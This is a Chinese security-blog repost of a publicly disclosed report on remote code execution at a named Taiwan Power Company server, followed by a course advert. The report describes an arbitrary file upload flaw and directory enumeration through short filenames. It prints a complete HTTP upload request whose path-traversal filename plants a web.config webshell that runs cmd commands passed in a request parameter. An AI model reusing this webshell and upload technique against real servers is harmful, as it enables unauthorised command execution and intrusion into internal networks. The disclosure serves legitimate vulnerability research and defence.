#  某电力公司web.config的RCE之旅   
点击关注👉  马哥网络安全   2025-04-19 09:02  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAk1nlByTOFiahZKGHekfZGC1V0p6QaXc4CnbPBMZQuFGAnW00CX43Xk9JXONUTxeqYxActf31UiajMg/640?wx_fmt=png&from=appmsg "")  
  
报告来源于某漏洞平台，是已公开的报告，作者：  
@Kaibro  
  
  
**0x01 叙述**  
  
https://ebppsmtp.taipower.com.tw/uploadfile/UploadFile.aspx  
 存在任意文件上传漏洞，上传文件內容及路径攻击者可控。  
  
由于 web目录不在常见路径下，所以沒办法直接写入 webshell  
  
但因为该路径使用短文件名格式，且不存在或无法写入路径会提示上传失败，所以可以穷举目录结构：  
```
- c:/var/
  - customers
  - delta
  - docs
  - downloads
  - FolderRequest
  - export
  - images
  - import
  - list
  - logfiles
  - quest
  - report
  - temp
  - templates
  - update
  - uploads
  - users
  - featur~1
  - subscr~1
  - unsubs~1
  - return~1
  - replym~1
  - receiv~1
```  
  
  
**0x02 上传文件过程**  
  
经过研究后发现实体路径C:/var/*下的內容对应到网站路径的   
https://ebppsmtp.taipower.com.tw/var/*  
由于尝试上传 asp / aspx / asmx 皆未被解析，故改以写入 web.config 方式，成功取得系統控制权限。  
  
上传 web.config webshell：  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeNqsHBkCST6xmT5MqwHAptEPU7FFCGyy71GJ6Lg44Fr6FDeB6llAia55SmUkhgyMN1jlhiatTw9Zqw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
执行命令  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeNqsHBkCST6xmT5MqwHApt71c1ge26bdB4UuBMnceQF5WxJrbguFJ6Msu8Ro5NCL3HbMtg0GLMPA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
执行 ipconfig 确认该机器位于 10.X.X.X 网段  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOeNqsHBkCST6xmT5MqwHApt5iboiaZicn6TFbn4Co8fqkhutAQqllmTViaOLiaWmgoKg4CfuXkLLuvQuKg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
上传 web.config webshell 请求包：  
```
POST /uploadfile/UploadFile.aspx HTTP/1.1
Host: ebppsmtp.taipower.com.tw
Cookie: ASP.NET_SessionId=g0mm3f454prtib55g5nwkj45
Content-Length: 1354
Origin: https://ebppsmtp.taipower.com.tw
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryv00ZBQrKTDBA8xQS
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close

------WebKitFormBoundaryv00ZBQrKTDBA8xQS
Content-Disposition: form-data; name="UploadFile"; filename="hi.txt"
Content-Type: text/plain

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<%
Response.Write("-"&"->")
Function GetCommandOutput(command)
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec(command)
    GetCommandOutput = exec.StdOut.ReadAll
End Function
Response.Write(GetCommandOutput("cmd /c " + Request("cmd")))
Response.Write("<!-"&"-")
%>
-->

------WebKitFormBoundaryv00ZBQrKTDBA8xQS
Content-Disposition: form-data; name="UploadFileName"

../../../../../var/uploads/web.config
------WebKitFormBoundaryv00ZBQrKTDBA8xQS--
```  
  
文  
章由潇湘信安排版，内容源自网络，侵删  
  
  
  
**今日福利**  
  
  
2025年网络安全大师班是今年更新的系统培训课程，欢迎大家咨询参加！  
  
本培训旨在为对安全感兴趣的师傅们提供系统的安全学习路线，在短时间内习得网络安全领域的关键技能，涵盖8个主要方向：  
- web安全  
  
- 攻防渗透  
  
- 云安全  
  
- 安全防御体系  
  
- 系统防护  
  
- 代码审计  
  
- DevSecOps  
  
- 安全开发  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/ITPWXgj1yo5RyPwl02uy8GfKHSsOIBgMliaQ5tuNQia3KbGCCL6N1tIx6n8iaOqad5FiaDmEb3UIYgOK3X7ErJn6UA/640?wx_fmt=jpeg&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
完整版课程内容  
  
请扫码备注：  
安全大纲，免费领取  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAnRc6Fq9n0XQIbiaYAQ8uLx8Ea7su1Yy6w5Ajib9o4varB47IU0ocHa7QxQUHTDWa3xqtPUDLgR4yhw/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
扫码咨询更多课程详情及优惠  
  
